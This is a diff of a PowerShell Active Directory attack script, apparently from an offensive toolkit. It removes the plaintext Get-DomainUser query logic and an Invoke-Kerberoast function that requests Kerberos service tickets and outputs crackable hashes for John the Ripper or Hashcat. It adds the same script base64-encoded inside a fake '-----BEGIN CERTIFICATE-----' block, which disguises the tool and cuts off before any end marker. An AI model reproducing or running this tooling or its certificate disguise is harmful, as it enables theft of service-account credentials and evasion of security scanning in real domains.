-    BEGIN {
-        $SearcherArguments = @{}
-        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
-        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
-        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
-        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
-        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
-        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
-        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
-        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
-        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
-        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
-        $UserSearcher = Get-DomainSearcher @SearcherArguments
-    }
-
-    PROCESS {
-        #bind dynamic parameter to a friendly variable
-        #if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
-        #    New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
-        #}
-
-        if ($UserSearcher) {
-            $IdentityFilter = ''
-            $Filter = ''
-            $Identity | Where-Object {$_} | ForEach-Object {
-                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
-                if ($IdentityInstance -match '^S-1-') {
-                    $IdentityFilter += "(objectsid=$IdentityInstance)"
-                }
-                elseif ($IdentityInstance -match '^CN=') {
-                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
-                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
-                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
-                        #   and rebuild the domain searcher
-                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-                        Write-Verbose "[Get-DomainUser] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
-                        $SearcherArguments['Domain'] = $IdentityDomain
-                        $UserSearcher = Get-DomainSearcher @SearcherArguments
-                        if (-not $UserSearcher) {
-                            Write-Warning "[Get-DomainUser] Unable to retrieve domain searcher for '$IdentityDomain'"
-                        }
-                    }
-                }
-                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
-                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
-                    $IdentityFilter += "(objectguid=$GuidByteString)"
-                }
-                elseif ($IdentityInstance.Contains('\')) {
-                    $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
-                    if ($ConvertedIdentityInstance) {
-                        $UserDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
-                        $UserName = $IdentityInstance.Split('\')[1]
-                        $IdentityFilter += "(samAccountName=$UserName)"
-                        $SearcherArguments['Domain'] = $UserDomain
-                        Write-Verbose "[Get-DomainUser] Extracted domain '$UserDomain' from '$IdentityInstance'"
-                        $UserSearcher = Get-DomainSearcher @SearcherArguments
-                    }
-                }
-                else {
-                    $IdentityFilter += "(samAccountName=$IdentityInstance)"
-                }
-            }
-
-            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
-                $Filter += "(|$IdentityFilter)"
-            }
-
-            if ($PSBoundParameters['SPN']) {
-                Write-Verbose '[Get-DomainUser] Searching for non-null service principal names'
-                $Filter += '(servicePrincipalName=*)'
-            }
-            if ($PSBoundParameters['AllowDelegation']) {
-                Write-Verbose '[Get-DomainUser] Searching for users who can be delegated'
-                # negation of "Accounts that are sensitive and not trusted for delegation"
-                $Filter += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
-            }
-            if ($PSBoundParameters['DisallowDelegation']) {
-                Write-Verbose '[Get-DomainUser] Searching for users who are sensitive and not trusted for delegation'
-                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
-            }
-            if ($PSBoundParameters['AdminCount']) {
-                Write-Verbose '[Get-DomainUser] Searching for adminCount=1'
-                $Filter += '(admincount=1)'
-            }
-            if ($PSBoundParameters['TrustedToAuth']) {
-                Write-Verbose '[Get-DomainUser] Searching for users that are trusted to authenticate for other principals'
-                $Filter += '(msds-allowedtodelegateto=*)'
-            }
-            if ($PSBoundParameters['PreauthNotRequired']) {
-                Write-Verbose '[Get-DomainUser] Searching for user accounts that do not require kerberos preauthenticate'
-                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
-            }
-            if ($PSBoundParameters['LDAPFilter']) {
-                Write-Verbose "[Get-DomainUser] Using additional LDAP filter: $LDAPFilter"
-                $Filter += "$LDAPFilter"
-            }
-
-            # build the LDAP filter for the dynamic UAC filter value
-            $UACFilter | Where-Object {$_} | ForEach-Object {
-                if ($_ -match 'NOT_.*') {
-                    $UACField = $_.Substring(4)
-                    $UACValue = [Int]($UACEnum::$UACField)
-                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
-                }
-                else {
-                    $UACValue = [Int]($UACEnum::$_)
-                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
-                }
-            }
-
-            $UserSearcher.filter = "(&(samAccountType=805306368)$Filter)"
-            Write-Verbose "[Get-DomainUser] filter string: $($UserSearcher.filter)"
-
-            if ($PSBoundParameters['FindOne']) { $Results = $UserSearcher.FindOne() }
-            else { $Results = $UserSearcher.FindAll() }
-            $Results | Where-Object {$_} | ForEach-Object {
-                if ($PSBoundParameters['Raw']) {
-                    # return raw result objects
-                    $User = $_
-                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
-                }
-                else {
-                    $User = Convert-LDAPProperty -Properties $_.Properties
-                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
-                }
-                $User
-            }
-            if ($Results) {
-                try { $Results.dispose() }
-                catch {
-                    Write-Verbose "[Get-DomainUser] Error disposing of the Results object: $_"
-                }
-            }
-            $UserSearcher.dispose()
-        }
-    }
-}
-
-
-function Invoke-Kerberoast {
-<#
-.SYNOPSIS
-Requests service tickets for kerberoast-able accounts and returns extracted ticket hashes.
-Author: Will Schroeder (@harmj0y), @machosec  
-License: BSD 3-Clause  
-Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf, Get-DomainUser, Get-DomainSPNTicket  
-.DESCRIPTION
-Uses Get-DomainUser to query for user accounts with non-null service principle
-names (SPNs) and uses Get-SPNTicket to request/extract the crackable ticket information.
-The ticket format can be specified with -OutputFormat <John/Hashcat>.
-.PARAMETER Identity
-A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
-SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
-Wildcards accepted.
-.PARAMETER Domain
-Specifies the domain to use for the query, defaults to the current domain.
-.PARAMETER LDAPFilter
-Specifies an LDAP query string that is used to filter Active Directory objects.
-.PARAMETER SearchBase
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-.PARAMETER Server
-Specifies an Active Directory server (domain controller) to bind to.
-.PARAMETER SearchScope
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-.PARAMETER ResultPageSize
-Specifies the PageSize to set for the LDAP searcher object.
-.PARAMETER ServerTimeLimit
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-.PARAMETER Tombstone
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-.PARAMETER OutputFormat
-Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format.
-Defaults to 'John'.
-.PARAMETER Credential
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-.PARAMETER Delay
-Specifies the delay in seconds between ticket requests.
-.PARAMETER Jitter
-Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3
-.EXAMPLE
-Invoke-Kerberoast | fl
-Kerberoasts all found SPNs for the current domain.
-.EXAMPLE
-Invoke-Kerberoast -Domain dev.testlab.local -OutputFormat HashCat | fl
-Kerberoasts all found SPNs for the testlab.local domain, outputting to HashCat
-format instead of John (the default).
-.EXAMPLE
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -orce
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLB\dfm.a', $SecPassword)
-Invoke-Kerberoast -Credential $Cred -Verbose -Domain testlab.local | fl
-Kerberoasts all found SPNs for the testlab.local domain using alternate credentials.
-.OUTPUTS
-PowerView.SPNTicket
-Outputs a custom object containing the SamAccountName, ServicePrincipalName, and encrypted ticket section.
-#>
-
-    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
-    [OutputType('PowerView.SPNTicket')]
-    [CmdletBinding()]
-    Param(
-        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
-        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
-        [String[]]
-        $Identity,
-
-        [ValidateNotNullOrEmpty()]
-        [String]
-        $Domain,
-
-        [ValidateNotNullOrEmpty()]
-        [Alias('Filter')]
-        [String]
-        $LDAPFilter,
-
-        [ValidateNotNullOrEmpty()]
-        [Alias('ADSPath')]
-        [String]
-        $SearchBase,
-
-        [ValidateNotNullOrEmpty()]
-        [Alias('DomainController')]
-        [String]
-        $Server,
-
-        [ValidateSet('Base', 'OneLevel', 'Subtree')]
-        [String]
-        $SearchScope = 'Subtree',
-
-        [ValidateRange(1, 10000)]
-        [Int]
-        $ResultPageSize = 200,
-
-        [ValidateRange(1, 10000)]
-        [Int]
-        $ServerTimeLimit,
-
-        [Switch]
-        $Tombstone,
-
-        [ValidateRange(0,10000)]
-        [Int]
-        $Delay = 0,
-
-        [ValidateRange(0.0, 1.0)]
-        [Double]
-        $Jitter = .3,
-
-        [ValidateSet('John', 'Hashcat')]
-        [Alias('Format')]
-        [String]
-        $OutputFormat = 'John',
-
-        [Management.Automation.PSCredential]
-        [Management.Automation.CredentialAttribute()]
-        $Credential = [Management.Automation.PSCredential]::Empty
-    )
-
-    BEGIN {
-        $UserSearcherArguments = @{
-            'SPN' = $True
-            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
-        }
-        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }
-        if ($PSBoundParameters['LDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $LDAPFilter }
-        if ($PSBoundParameters['SearchBase']) { $UserSearcherArguments['SearchBase'] = $SearchBase }
-        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
-        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
-        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
-        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
-        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
-        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }
-
-        if ($PSBoundParameters['Credential']) {
-            $LogonToken = Invoke-UserImpersonation -Credential $Credential
-        }
-    }
-
-    PROCESS {
-        if ($PSBoundParameters['Identity']) { $UserSearcherArguments['Identity'] = $Identity }
-        Get-DomainUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Get-DomainSPNTicket -Delay $Delay -OutputFormat $OutputFormat -Jitter $Jitter
-    }
-
-    END {
-        if ($LogonToken) {
-            Invoke-RevertToSelf -TokenHandle $LogonToken
-        }
-    }
-}
+-----BEGIN CERTIFICATE-----
+PCMNCg0KS2VyYmVyb2FzdC5wczENCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBo
+YXJtajB5KQ0KTGljZW5zZTogQlNEIDMtQ2xhdXNlDQpSZXF1aXJlZCBEZXBlbmRl
+bmNpZXM6IE5vbmUNCg0KTm90ZTogdGhlIHByaW1hcnkgbWV0aG9kIG9mIHVzZSB3
+aWxsIGJlIEludm9rZS1LZXJiZXJvYXN0IHdpdGgNCnZhcmlvdXMgdGFyZ2V0aW5n
+IG9wdGlvbnMuDQoNCiM+DQoNCmZ1bmN0aW9uIEdldC1Eb21haW5TZWFyY2hlciB7
+DQo8Iw0KLlNZTk9QU0lTDQpIZWxwZXIgdXNlZCBieSB2YXJpb3VzIGZ1bmN0aW9u
+cyB0aGF0IGJ1aWxkcyBhIGN1c3RvbSBBRCBzZWFyY2hlciBvYmplY3QuDQpBdXRo
+b3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIA0KTGljZW5zZTogQlNEIDMt
+Q2xhdXNlICANClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LURvbWFpbiAgDQou
+REVTQ1JJUFRJT04NClRha2VzIGEgZ2l2ZW4gZG9tYWluIGFuZCBhIG51bWJlciBv
+ZiBjdXN0b21pemF0aW9ucyBhbmQgcmV0dXJucyBhDQpTeXN0ZW0uRGlyZWN0b3J5
+U2VydmljZXMuRGlyZWN0b3J5U2VhcmNoZXIgb2JqZWN0LiBUaGlzIGZ1bmN0aW9u
+IGlzIHVzZWQNCmhlYXZpbHkgYnkgb3RoZXIgTERBUC9BRFNJIHNlYXJjaGVyIGZ1
+bmN0aW9ucyAoVmVyYi1Eb21haW4qKS4NCi5QQVJBTUVURVIgRG9tYWluDQpTcGVj
+aWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgZm9yIHRoZSBxdWVyeSwgZGVmYXVsdHMg
+dG8gdGhlIGN1cnJlbnQgZG9tYWluLg0KLlBBUkFNRVRFUiBMREFQRmlsdGVyDQpT
+cGVjaWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRvIGZp
+bHRlciBBY3RpdmUgRGlyZWN0b3J5IG9iamVjdHMuDQouUEFSQU1FVEVSIFByb3Bl
+cnRpZXMNClNwZWNpZmllcyB0aGUgcHJvcGVydGllcyBvZiB0aGUgb3V0cHV0IG9i
+amVjdCB0byByZXRyaWV2ZSBmcm9tIHRoZSBzZXJ2ZXIuDQouUEFSQU1FVEVSIFNl
+YXJjaEJhc2UNClRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCwgZS5n
+LiAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIg0KVXNlZnVs
+IGZvciBPVSBxdWVyaWVzLg0KLlBBUkFNRVRFUiBTZWFyY2hCYXNlUHJlZml4DQpT
+cGVjaWZpZXMgYSBwcmVmaXggZm9yIHRoZSBMREFQIHNlYXJjaCBzdHJpbmcgKGku
+ZS4gIkNOPVNpdGVzLENOPUNvbmZpZ3VyYXRpb24iKS4NCi5QQVJBTUVURVIgU2Vy
+dmVyDQpTcGVjaWZpZXMgYW4gQWN0aXZlIERpcmVjdG9yeSBzZXJ2ZXIgKGRvbWFp
+biBjb250cm9sbGVyKSB0byBiaW5kIHRvIGZvciB0aGUgc2VhcmNoLg0KLlBBUkFN
+RVRFUiBTZWFyY2hTY29wZQ0KU3BlY2lmaWVzIHRoZSBzY29wZSB0byBzZWFyY2gg
+dW5kZXIsIEJhc2UvT25lTGV2ZWwvU3VidHJlZSAoZGVmYXVsdCBvZiBTdWJ0cmVl
+KS4NCi5QQVJBTUVURVIgUmVzdWx0UGFnZVNpemUNClNwZWNpZmllcyB0aGUgUGFn
+ZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuDQouUEFS
+QU1FVEVSIFJlc3VsdFBhZ2VTaXplDQpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRv
+IHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0Lg0KLlBBUkFNRVRFUiBT
+ZXJ2ZXJUaW1lTGltaXQNClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2Yg
+dGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIw
+IHNlY29uZHMuDQouUEFSQU1FVEVSIFNlY3VyaXR5TWFza3MNClNwZWNpZmllcyBh
+biBvcHRpb24gZm9yIGV4YW1pbmluZyBzZWN1cml0eSBpbmZvcm1hdGlvbiBvZiBh
+IGRpcmVjdG9yeSBvYmplY3QuDQpPbmUgb2YgJ0RhY2wnLCAnR3JvdXAnLCAnTm9u
+ZScsICdPd25lcicsICdTYWNsJy4NCi5QQVJBTUVURVIgVG9tYnN0b25lDQpTd2l0
+Y2guIFNwZWNpZmllcyB0aGF0IHRoZSBzZWFyY2hlciBzaG91bGQgYWxzbyByZXR1
+cm4gZGVsZXRlZC90b21ic3RvbmVkIG9iamVjdHMuDQouUEFSQU1FVEVSIENyZWRl
+bnRpYWwNCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9i
+amVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMNCmZvciBjb25uZWN0aW9uIHRv
+IHRoZSB0YXJnZXQgZG9tYWluLg0KLkVYQU1QTEUNCkdldC1Eb21haW5TZWFyY2hl
+ciAtRG9tYWluIHRlc3RsYWIubG9jYWwNClJldHVybiBhIHNlYXJjaGVyIGZvciBh
+bGwgb2JqZWN0cyBpbiB0ZXN0bGFiLmxvY2FsLg0KLkVYQU1QTEUNCkdldC1Eb21h
+aW5TZWFyY2hlciAtRG9tYWluIHRlc3RsYWIubG9jYWwgLUxEQVBGaWx0ZXIgJyhz
+YW1BY2NvdW50VHlwZT04MDUzMDYzNjgpJyAtUHJvcGVydGllcyAnU2FtQWNjb3Vu
+dE5hbWUsbGFzdGxvZ29uJw0KUmV0dXJuIGEgc2VhcmNoZXIgZm9yIHVzZXIgb2Jq
+ZWN0cyBpbiB0ZXN0bGFiLmxvY2FsIGFuZCBvbmx5IHJldHVybiB0aGUgU2FtQWNj
+b3VudE5hbWUgYW5kIExhc3RMb2dvbiBwcm9wZXJ0aWVzLg0KLkVYQU1QTEUNCkdl
+dC1Eb21haW5TZWFyY2hlciAtU2VhcmNoQmFzZSAiTERBUDovL09VPXNlY3JldCxE
+Qz10ZXN0bGFiLERDPWxvY2FsIg0KUmV0dXJuIGEgc2VhcmNoZXIgdGhhdCBzZWFy
+Y2hlcyB0aHJvdWdoIHRoZSBzcGVjaWZpYyBBRFMvTERBUCBzZWFyY2ggYmFzZSAo
+aS5lLiBPVSkuDQouT1VUUFVUUw0KU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRp
+cmVjdG9yeVNlYXJjaGVyDQojPg0KDQogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFs
+eXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2Vzcycs
+ICcnKV0NCiAgICBbT3V0cHV0VHlwZSgnU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2Vz
+LkRpcmVjdG9yeVNlYXJjaGVyJyldDQogICAgW0NtZGxldEJpbmRpbmcoKV0NCiAg
+ICBQYXJhbSgNCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZSA9
+ICRUcnVlKV0NCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0NCiAg
+ICAgICAgW1N0cmluZ10NCiAgICAgICAgJERvbWFpbiwNCg0KICAgICAgICBbVmFs
+aWRhdGVOb3ROdWxsT3JFbXB0eSgpXQ0KICAgICAgICBbQWxpYXMoJ0ZpbHRlcicp
+XQ0KICAgICAgICBbU3RyaW5nXQ0KICAgICAgICAkTERBUEZpbHRlciwNCg0KICAg
+ICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQ0KICAgICAgICBbU3RyaW5n
+W11dDQogICAgICAgICRQcm9wZXJ0aWVzLA0KDQogICAgICAgIFtWYWxpZGF0ZU5v
+dE51bGxPckVtcHR5KCldDQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQ0KICAg
+ICAgICBbU3RyaW5nXQ0KICAgICAgICAkU2VhcmNoQmFzZSwNCg0KICAgICAgICBb
+VmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQ0KICAgICAgICBbU3RyaW5nXQ0KICAg
+ICAgICAkU2VhcmNoQmFzZVByZWZpeCwNCg0KICAgICAgICBbVmFsaWRhdGVOb3RO
+dWxsT3JFbXB0eSgpXQ0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXIn
+KV0NCiAgICAgICAgW1N0cmluZ10NCiAgICAgICAgJFNlcnZlciwNCg0KICAgICAg
+ICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQ0K
+ICAgICAgICBbU3RyaW5nXQ0KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJl
+ZScsDQoNCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQ0KICAgICAg
+ICBbSW50XQ0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsDQoNCiAgICAg
+ICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQ0KICAgICAgICBbSW50XQ0KICAg
+ICAgICAkU2VydmVyVGltZUxpbWl0ID0gMTIwLA0KDQogICAgICAgIFtWYWxpZGF0
+ZVNldCgnRGFjbCcsICdHcm91cCcsICdOb25lJywgJ093bmVyJywgJ1NhY2wnKV0N
+CiAgICAgICAgW1N0cmluZ10NCiAgICAgICAgJFNlY3VyaXR5TWFza3MsDQoNCiAg
+ICAgICAgW1N3aXRjaF0NCiAgICAgICAgJFRvbWJzdG9uZSwNCg0KICAgICAgICBb
+TWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0NCiAgICAgICAgW01h
+bmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldDQogICAg
+ICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRl
+bnRpYWxdOjpFbXB0eQ0KICAgICkNCg0KICAgIFBST0NFU1Mgew0KICAgICAgICBp
+ZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgew0KICAgICAgICAgICAg
+JFRhcmdldERvbWFpbiA9ICREb21haW4NCiAgICAgICAgfQ0KICAgICAgICBlbHNl
+IHsNCiAgICAgICAgICAgICMgaWYgbm90IC1Eb21haW4gaXMgc3BlY2lmaWVkLCBy
+ZXRyaWV2ZSB0aGUgY3VycmVudCBkb21haW4gbmFtZQ0KICAgICAgICAgICAgaWYg
+KCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7DQogICAgICAgICAg
+ICAgICAgJERvbWFpbk9iamVjdCA9IEdldC1Eb21haW4gLUNyZWRlbnRpYWwgJENy
+ZWRlbnRpYWwNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2Ugew0KICAg
+ICAgICAgICAgICAgICREb21haW5PYmplY3QgPSBHZXQtRG9tYWluDQogICAgICAg
+ICAgICB9DQogICAgICAgICAgICAkVGFyZ2V0RG9tYWluID0gJERvbWFpbk9iamVj
+dC5OYW1lDQogICAgICAgIH0NCg0KICAgICAgICBpZiAoLW5vdCAkUFNCb3VuZFBh
+cmFtZXRlcnNbJ1NlcnZlciddKSB7DQogICAgICAgICAgICAjIGlmIHRoZXJlJ3Mg
+bm90IGEgc3BlY2lmaWVkIHNlcnZlciB0byBiaW5kIHRvLCB0cnkgdG8gcHVsbCB0
+aGUgY3VycmVudCBkb21haW4gUERDDQogICAgICAgICAgICB0cnkgew0KICAgICAg
+ICAgICAgICAgIGlmICgkRG9tYWluT2JqZWN0KSB7DQogICAgICAgICAgICAgICAg
+ICAgICRCaW5kU2VydmVyID0gJERvbWFpbk9iamVjdC5QZGNSb2xlT3duZXIuTmFt
+ZQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlaWYgKCRQ
+U0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7DQogICAgICAgICAgICAg
+ICAgICAgICRCaW5kU2VydmVyID0gKChHZXQtRG9tYWluIC1DcmVkZW50aWFsICRD
+cmVkZW50aWFsKS5QZGNSb2xlT3duZXIpLk5hbWUNCiAgICAgICAgICAgICAgICB9
+DQogICAgICAgICAgICAgICAgZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICRC
+aW5kU2VydmVyID0gKChHZXQtRG9tYWluKS5QZGNSb2xlT3duZXIpLk5hbWUNCiAg
+ICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRj
+aCB7DQogICAgICAgICAgICAgICAgdGhyb3cgIltHZXQtRG9tYWluU2VhcmNoZXJd
+IEVycm9yIGluIHJldHJpZXZpbmcgUERDIGZvciBjdXJyZW50IGRvbWFpbjogJF8i
+DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgZWxzZSB7DQogICAg
+ICAgICAgICAkQmluZFNlcnZlciA9ICRTZXJ2ZXINCiAgICAgICAgfQ0KDQogICAg
+ICAgICRTZWFyY2hTdHJpbmcgPSAnTERBUDovLycNCg0KICAgICAgICBpZiAoJEJp
+bmRTZXJ2ZXIgLWFuZCAoJEJpbmRTZXJ2ZXIuVHJpbSgpIC1uZSAnJykpIHsNCiAg
+ICAgICAgICAgICRTZWFyY2hTdHJpbmcgKz0gJEJpbmRTZXJ2ZXINCiAgICAgICAg
+ICAgIGlmICgkVGFyZ2V0RG9tYWluKSB7DQogICAgICAgICAgICAgICAgJFNlYXJj
+aFN0cmluZyArPSAnLycNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAg
+ICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2VQcmVmaXgnXSkg
+ew0KICAgICAgICAgICAgJFNlYXJjaFN0cmluZyArPSAkU2VhcmNoQmFzZVByZWZp
+eCArICcsJw0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1l
+dGVyc1snU2VhcmNoQmFzZSddKSB7DQogICAgICAgICAgICBpZiAoJFNlYXJjaEJh
+c2UgLU1hdGNoICdeR0M6Ly8nKSB7DQogICAgICAgICAgICAgICAgIyBpZiB3ZSdy
+ZSBzZWFyY2hpbmcgdGhlIGdsb2JhbCBjYXRhbG9nLCBnZXQgdGhlIHBhdGggaW4g
+dGhlIHJpZ2h0IGZvcm1hdA0KICAgICAgICAgICAgICAgICRETiA9ICRTZWFyY2hC
+YXNlLlRvVXBwZXIoKS5UcmltKCcvJykNCiAgICAgICAgICAgICAgICAkU2VhcmNo
+U3RyaW5nID0gJycNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2Ugew0K
+ICAgICAgICAgICAgICAgIGlmICgkU2VhcmNoQmFzZSAtbWF0Y2ggJ15MREFQOi8v
+Jykgew0KICAgICAgICAgICAgICAgICAgICBpZiAoJFNlYXJjaEJhc2UgLW1hdGNo
+ICJMREFQOi8vLisvLisiKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkU2Vh
+cmNoU3RyaW5nID0gJycNCiAgICAgICAgICAgICAgICAgICAgICAgICRETiA9ICRT
+ZWFyY2hCYXNlDQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAg
+ICAgICAgZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkRE4gPSAkU2Vh
+cmNoQmFzZS5TdWJTdHJpbmcoNykNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAg
+ICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlIHsNCiAgICAgICAg
+ICAgICAgICAgICAgJEROID0gJFNlYXJjaEJhc2UNCiAgICAgICAgICAgICAgICB9
+DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgZWxzZSB7DQogICAg
+ICAgICAgICAjIHRyYW5zZm9ybSB0aGUgdGFyZ2V0IGRvbWFpbiBuYW1lIGludG8g
+YSBkaXN0aW5ndWlzaGVkTmFtZSBpZiBhbiBBRFMgc2VhcmNoIGJhc2UgaXMgbm90
+IHNwZWNpZmllZA0KICAgICAgICAgICAgaWYgKCRUYXJnZXREb21haW4gLWFuZCAo
+JFRhcmdldERvbWFpbi5UcmltKCkgLW5lICcnKSkgew0KICAgICAgICAgICAgICAg
+ICRETiA9ICJEQz0kKCRUYXJnZXREb21haW4uUmVwbGFjZSgnLicsICcsREM9Jykp
+Ig0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgJFNlYXJjaFN0
+cmluZyArPSAkRE4NCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5T
+ZWFyY2hlcl0gc2VhcmNoIHN0cmluZzogJFNlYXJjaFN0cmluZyINCg0KICAgICAg
+ICBpZiAoJENyZWRlbnRpYWwgLW5lIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFND
+cmVkZW50aWFsXTo6RW1wdHkpIHsNCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2Ug
